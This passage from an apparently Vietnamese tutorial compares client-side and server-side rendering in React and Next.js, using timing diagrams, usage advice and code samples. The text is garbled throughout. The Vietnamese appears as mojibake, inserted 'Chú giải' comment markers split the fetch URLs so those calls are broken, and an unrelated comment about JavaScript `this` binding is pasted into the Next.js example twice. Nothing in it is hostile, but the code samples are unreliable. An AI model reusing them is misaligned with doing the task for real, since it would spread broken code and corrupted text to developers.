**3. Complexity Cao (Complex Setup)**
```typescript
 // Ch√∫ gi·∫£i: CSR: Simple
ReactDOM.render(<App />, root);

 // Ch√∫ gi·∫£i: SSR: Complex
- Server setup (Express, Next.js)
- Hydration issues (client-server mismatch)
- Data fetching strategies
- Cache invalidation
- State management across server-client
‚Üí Nhi·ªÅu bugs ti·ªÅm ·∫©n, kh√≥ debug
```

**4. TTFB Cao H∆°n (Time to First Byte)**
```
CSR:
- TTFB: 50ms (serve static file)

SSR:
- TTFB: 200-500ms (render + fetch data)
‚Üí User ƒë·ª£i l√¢u h∆°n tr∆∞·ªõc khi th·∫•y g√¨ ƒë√≥
(nh∆∞ng khi th·∫•y th√¨ ƒë√£ c√≥ full content)
```

**5. Hydration Issues**
```typescript
 // Ch√∫ gi·∫£i: Server renders: <div>Count: 0</div>
 // Ch√∫ gi·∫£i: Client state:   <div>Count: 1</div>
 // Ch√∫ gi·∫£i: ‚Üí Mismatch! Warning!

 // Ch√∫ gi·∫£i: Common issues:
- Date.now() kh√°c nhau server vs client
- Random values
- Browser-only APIs (window, localStorage)
‚Üí Requires careful coding
```

---

#### **üìä So S√°nh Tr·ª±c Quan**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    USER EXPERIENCE COMPARISON                    ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                                  ‚îÇ
‚îÇ  CSR (Client-Side Rendering):                                   ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
‚îÇ  ‚îÇ 0s ‚ñì‚ñì‚ñì‚ñì‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë  ‚Üê Blank screen          ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ 1s ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë  ‚Üê Downloading JS         ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ 2s ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë  ‚Üê Parsing JS             ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ 3s ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë  ‚Üê Fetching data          ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ 4s ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë  ‚Üê Rendering               ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ 5s ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì  ‚úÖ Content visible!      ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ                                                            ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ First Content: 5 seconds                                  ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ User sees: Blank ‚Üí Loading ‚Üí Content                     ‚îÇ  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
‚îÇ                                                                  ‚îÇ
‚îÇ  SSR (Server-Side Rendering):                                   ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
‚îÇ  ‚îÇ 0s ‚ñì‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë  ‚Üê Server rendering      ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ 0.5s ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì  ‚úÖ Content visible!      ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ 1s ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì  ‚Üê Hydrating JS            ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ 2s ‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì‚ñì  ‚úÖ Interactive!           ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ                                                            ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ First Content: 0.5 seconds                                ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ Interactive: 2 seconds                                    ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ User sees: Content immediately ‚Üí Becomes interactive     ‚îÇ  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
‚îÇ                                                                  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

#### **üéØ Khi N√†o D√πng G√¨?**

**D√πng CSR khi:**
```
‚úÖ Internal tools / Admin dashboard
   ‚Üí Kh√¥ng c·∫ßn SEO, user ƒë√£ login
   ‚Üí Example: Google Analytics, Jira, Notion

‚úÖ Highly interactive apps
   ‚Üí Real-time updates, complex interactions
   ‚Üí Example: Figma, Trello, Games

‚úÖ Budget th·∫•p
   ‚Üí Ch·ªâ c·∫ßn CDN, kh√¥ng c·∫ßn server m·∫°nh
   ‚Üí Startup v·ªõi limited resources
```

**D√πng SSR khi:**
```
‚úÖ Public-facing websites
   ‚Üí C·∫ßn SEO, social sharing
   ‚Üí Example: Blog, News, E-commerce

‚úÖ Landing pages / Marketing
   ‚Üí First impression matters
   ‚Üí Better conversion rate

‚úÖ Content-heavy sites
   ‚Üí Nhi·ªÅu text, √≠t interaction
   ‚Üí Example: Documentation, Wikipedia
```

**D√πng SSG (Hybrid) khi:**
```
‚úÖ Static content with occasional updates
   ‚Üí Blog posts, product pages
   ‚Üí Example: Next.js with ISR

‚úÖ Best of both worlds
   ‚Üí Fast nh∆∞ CSR (served from CDN)
   ‚Üí SEO-friendly nh∆∞ SSR
   ‚Üí Cost-effective
```

---

#### **üí° Key Takeaways**

**CSR (Client-Side):**
- üöÄ Navigation nhanh, t∆∞∆°ng t√°c m∆∞·ª£t
- üí∞ Chi ph√≠ th·∫•p, d·ªÖ deploy
- ‚ùå Initial load ch·∫≠m (3-5s), SEO k√©m
- üéØ **D√πng cho**: Internal tools, SPAs, interactive apps

**SSR (Server-Side):**
- ‚ö° Initial load nhanh (0.5-1s), SEO t·ªët
- ‚úÖ Kh√¥ng blank screen, better UX
- ‚ùå Server cost cao, navigation ch·∫≠m h∆°n
- üéØ **D√πng cho**: Public sites, marketing, e-commerce

**Modern Approach:**
- **Mix c·∫£ 3**: SSG (static pages) + SSR (dynamic) + CSR (interactive)
- **Framework**: Next.js, Remix, Nuxt.js h·ªó tr·ª£ c·∫£ 3
- **Measure**: D√πng Lighthouse, Web Vitals ƒë·ªÉ optimize

---

#### **üìä S∆° ƒê·ªì So S√°nh CSR vs SSR**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    CSR vs SSR COMPARISON                            ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                                     ‚îÇ
‚îÇ  CLIENT-SIDE RENDERING (CSR)                                       ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ 1. Browser Request ‚Üí Server                                   ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    GET https: // Ch√∫ gi·∫£i: example.com                                    ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                                                                ‚îÇ ‚îÇ
‚îÇ  ‚îÇ 2. Server Response (Minimal HTML)                             ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    <!DOCTYPE html>                                            ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    <html><head>...</head>                                     ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    <body>                                                     ‚îÇ ‚îÇ
‚îÇ  ‚îÇ      <div id="root"></div>  ‚Üê Empty!                         ‚îÇ ‚îÇ
‚îÇ  ‚îÇ      <script src="/bundle.js"></script>                      ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    </body></html>                                            ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                                                                ‚îÇ ‚îÇ
‚îÇ  ‚îÇ 3. Browser Downloads JS Bundle (Large!)                       ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    bundle.js (500KB - 2MB)                                    ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚è±Ô∏è  Parsing + Execution time                               ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                                                                ‚îÇ ‚îÇ
‚îÇ  ‚îÇ 4. JavaScript Runs & Renders UI                               ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    React.render(<App />, root)                               ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚Üí API calls                                                ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚Üí Fetch data                                               ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚Üí Render components                                        ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                                                                ‚îÇ ‚îÇ
‚îÇ  ‚îÇ 5. User Sees Content                                          ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚è±Ô∏è  Total: 3-5 seconds                                     ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îÇ                                                                     ‚îÇ
‚îÇ  SERVER-SIDE RENDERING (SSR)                                       ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ 1. Browser Request ‚Üí Server                                   ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    GET https: // Ch√∫ gi·∫£i: example.com                                    ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                                                                ‚îÇ ‚îÇ
‚îÇ  ‚îÇ 2. Server Renders Full HTML                                   ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    - Execute React on server                                  ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    - Fetch data from database                                 ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    - Generate complete HTML                                   ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚è±Ô∏è  Server processing time                                 ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                                                                ‚îÇ ‚îÇ
‚îÇ  ‚îÇ 3. Server Response (Full HTML)                                ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    <!DOCTYPE html>                                            ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    <html><head>...</head>                                     ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    <body>                                                     ‚îÇ ‚îÇ
‚îÇ  ‚îÇ      <div id="root">                                          ‚îÇ ‚îÇ
‚îÇ  ‚îÇ        <h1>Welcome!</h1>                                      ‚îÇ ‚îÇ
‚îÇ  ‚îÇ        <p>Fully rendered content...</p>  ‚Üê Complete!         ‚îÇ ‚îÇ
‚îÇ  ‚îÇ      </div>                                                   ‚îÇ ‚îÇ
‚îÇ  ‚îÇ      <script src="/bundle.js"></script>                      ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    </body></html>                                            ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                                                                ‚îÇ ‚îÇ
‚îÇ  ‚îÇ 4. Browser Shows Content Immediately                          ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚è±Ô∏è  User sees content: 0.5-1 second                        ‚îÇ ‚îÇ
‚îÇ  ‚îÇ                                                                ‚îÇ ‚îÇ
‚îÇ  ‚îÇ 5. JavaScript Hydrates (Makes Interactive)                    ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    React.hydrate(<App />, root)                              ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚Üí Attach event listeners                                   ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚Üí Make interactive                                         ‚îÇ ‚îÇ
‚îÇ  ‚îÇ    ‚è±Ô∏è  Total interactive: 2-3 seconds                         ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îÇ                                                                     ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

#### **üî• CSR (Client-Side Rendering) - C√°ch Ho·∫°t ƒê·ªông Chi Ti·∫øt**

**Timeline:**

```
User clicks link
      ‚Üì
[1] Browser ‚Üí Server: GET /page
      ‚Üì
[2] Server ‚Üí Browser: Minimal HTML + <script src="bundle.js">
      ‚Üì                 (5-50 KB)
      ‚Üì
[3] Browser downloads bundle.js
      ‚Üì                 (500KB - 2MB)
      ‚Üì                 ‚è±Ô∏è  1-3 seconds
      ‚Üì
[4] Browser parses & executes JS
      ‚Üì                 ‚è±Ô∏è  0.5-1 second
      ‚Üì
[5] React renders virtual DOM
      ‚Üì
[6] React makes API calls
      ‚Üì                 ‚è±Ô∏è  0.5-2 seconds
      ‚Üì
[7] Data arrives ‚Üí Re-render
      ‚Üì
[8] User sees content
      ‚Üì                 ‚è±Ô∏è  Total: 3-5 seconds
```

**Code Example (React CSR):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: CSR Example - React App
 // Ch√∫ gi·∫£i: ============================================

// index.html - Minimal HTML (ch·ªâ c√≥ div r·ªóng)
 // Ch√∫ gi·∫£i: <!DOCTYPE html>
 // Ch√∫ gi·∫£i: <html>
 // Ch√∫ gi·∫£i: <head>
 // Ch√∫ gi·∫£i: <title>My App</title>
 // Ch√∫ gi·∫£i: </head>
 // Ch√∫ gi·∫£i: <body>
 // Ch√∫ gi·∫£i: <div id="root"></div>  ‚Üê EMPTY!
 // Ch√∫ gi·∫£i: <script src="/bundle.js"></script>
 // Ch√∫ gi·∫£i: </body>
 // Ch√∫ gi·∫£i: </html>

 // Ch√∫ gi·∫£i: main.tsx - Entry point
import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './App';

 // Ch√∫ gi·∫£i: Render app on client
const root = ReactDOM.createRoot(document.getElementById('root')!);
root.render(<App />);

 // Ch√∫ gi·∫£i: App.tsx - Main component
import { useState, useEffect } from 'react';

interface User {
  id: number;
  name: string;
  email: string;
}

function App() {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(true);

 // Ch√∫ gi·∫£i: Fetch data on client
  useEffect(() => {
    fetch('https: // Ch√∫ gi·∫£i: api.example.com/users')
      .then((res) => res.json())
      .then((data) => {
        setUsers(data);
        setLoading(false);
      });
  }, []);

  if (loading) {
    return <div>Loading...</div>; // Ch√∫ gi·∫£i: User sees loading state
  }

  return (
    <div>
      <h1>Users</h1>
      <ul>
        {users.map((user) => (
          <li key={user.id}>
            {user.name} - {user.email}
          </li>
        ))}
      </ul>
    </div>
  );
}

export default App;

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: What happens in browser:
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 1. Download HTML (5KB) - instant
 // Ch√∫ gi·∫£i: 2. Download bundle.js (500KB) - 1-2 seconds
 // Ch√∫ gi·∫£i: 3. Parse & execute JS - 0.5 seconds
 // Ch√∫ gi·∫£i: 4. React renders <div>Loading...</div>
 // Ch√∫ gi·∫£i: 5. Fetch API - 0.5-1 second
 // Ch√∫ gi·∫£i: 6. Re-render with data
 // Ch√∫ gi·∫£i: Total: 3-5 seconds until user sees content
```

---

#### **üöÄ SSR (Server-Side Rendering) - C√°ch Ho·∫°t ƒê·ªông Chi Ti·∫øt**

**Timeline:**

```
User clicks link
      ‚Üì
[1] Browser ‚Üí Server: GET /page
      ‚Üì
[2] Server executes React
      ‚Üì
[3] Server fetches data from DB
      ‚Üì                 ‚è±Ô∏è  0.1-0.5 seconds
      ‚Üì
[4] Server renders HTML
      ‚Üì                 ‚è±Ô∏è  0.1-0.3 seconds
      ‚Üì
[5] Server ‚Üí Browser: Full HTML
      ‚Üì                 (50-200 KB)
      ‚Üì
[6] Browser displays HTML immediately
      ‚Üì                 ‚è±Ô∏è  User sees content: 0.5-1 second
      ‚Üì
[7] Browser downloads JS bundle
      ‚Üì                 (background)
      ‚Üì
[8] Hydration - Make interactive
      ‚Üì                 ‚è±Ô∏è  0.5-1 second
      ‚Üì
[9] Fully interactive
      ‚Üì                 ‚è±Ô∏è  Total interactive: 2-3 seconds
```

**Code Example (Next.js SSR):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: SSR Example - Next.js
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: pages/users.tsx - SSR page
import { GetServerSideProps } from 'next';

interface User {
  id: number;
  name: string;
  email: string;
}

interface Props {
  users: User[];
}

 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
export const getServerSideProps: GetServerSideProps<Props> = async () => {
 // Ch√∫ gi·∫£i: Fetch data on server
  const res = await fetch('https: // Ch√∫ gi·∫£i: api.example.com/users');
  const users = await res.json();

 // Ch√∫ gi·∫£i: Pass data to component as props
  return {
    props: {
      users, // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
    },
  };
};

 // Ch√∫ gi·∫£i: Component renders on server
function UsersPage({ users }: Props) {
 // Ch√∫ gi·∫£i: No loading state needed - data is already here!
  return (
    <div>
      <h1>Users</h1>
      <ul>
        {users.map((user) => (
          <li key={user.id}>
            {user.name} - {user.email}
          </li>
        ))}
      </ul>
    </div>
  );
}

export default UsersPage;

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: What happens:
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 1. User requests /users
 // Ch√∫ gi·∫£i: 2. Next.js server:
 // Ch√∫ gi·∫£i: - Runs getServerSideProps()
 // Ch√∫ gi·∫£i: - Fetches data from API
 // Ch√∫ gi·∫£i: - Renders component to HTML string
 // Ch√∫ gi·∫£i: - Sends full HTML to browser
 // Ch√∫ gi·∫£i: 3. Browser displays HTML immediately (0.5-1s)
